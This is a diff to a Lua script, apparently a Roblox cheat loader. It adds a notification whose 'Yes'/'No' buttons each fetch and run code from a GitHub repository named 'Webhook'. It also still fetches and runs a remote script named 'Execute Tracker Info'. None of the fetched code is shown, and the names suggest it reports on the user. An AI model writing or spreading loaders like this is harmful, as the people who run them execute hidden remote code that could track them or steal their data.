@@ -1,3 +1,21 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/mpaio58a/Idk/refs/heads/main/Kitty%20For%20Service"))()
+local bindable = Instance.new("BindableFunction")
+
+bindable.OnInvoke = function(buttonText)
+    if buttonText == "Yes" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/mpaio58a/Webhook/refs/heads/main/25%25%20progess"))()
+    elseif buttonText == "No" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/mpaio58a/Webhook/refs/heads/main/normal%20script"))()
+    end
+end
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "25% Progress",
+    Text = "You want to try next update but 25% Progress?",
+    Duration = 80000,
+    Callback = bindable,
+    Button1 = "Yes",
+    Button2 = "No"
+})
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/mpaio58a/Idk/refs/heads/main/Execute%20Tracker%20Info"))()
 print("Thanks For Playing ^_^")
